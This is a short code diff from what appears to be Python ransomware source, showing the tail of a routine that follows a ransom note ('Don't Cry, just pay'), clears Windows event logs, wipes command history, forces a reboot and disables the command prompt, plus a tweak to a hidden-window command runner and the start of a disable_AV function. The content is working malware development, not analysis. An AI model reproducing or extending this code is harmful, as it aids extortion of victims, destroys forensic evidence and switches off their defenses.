@@ -472,14 +472,19 @@ Don't Cry, just pay =}}"""
     )
     clear_event_logs()
     execute_command("doskey /listsize=0")
-    execute_command("shutdown /r /f /t 3")
+    execute_command("shutdown /r /f /t 5", wait=False)
     disable_cmd()
 
 
-def execute_command(command, shell=True):
-    return subprocess.Popen(
-        command, creationflags=subprocess.CREATE_NO_WINDOW, shell=shell
-    ).wait()
+def execute_command(command, shell=True, wait=True):
+    if wait:
+        return subprocess.Popen(
+            command, creationflags=subprocess.CREATE_NO_WINDOW, shell=shell
+        ).wait()
+    else: 
+        return subprocess.Popen(
+            command, creationflags=subprocess.CREATE_NO_WINDOW, shell=shell
+        )
 
 
 def disable_AV():
